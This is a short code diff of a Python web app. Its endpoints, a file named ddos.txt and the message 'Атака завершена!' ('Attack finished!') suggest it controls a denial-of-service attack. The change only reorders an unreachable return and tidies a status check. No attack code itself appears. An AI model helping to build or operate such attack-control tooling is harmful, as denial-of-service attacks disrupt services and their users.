@@ -19,15 +19,18 @@ def save_text(message):
 def status():
     with open("status.txt", "r") as file2:
         stat = str(file2.read())
-    return stat
+    if stat == "Started!":
+        return "Started!"
+    else:
+        return "Stopped!"
 
 @app.route("/stop")
 def stop():
-    return "Атака завершена!"
     with open("status.txt", "w") as file3:
         file3.write("Stopped!")
     with open("ddos.txt", "w") as file4:
     	file4.write("")
+    return "Атака завершена!"
 
 @app.route("/update")
 
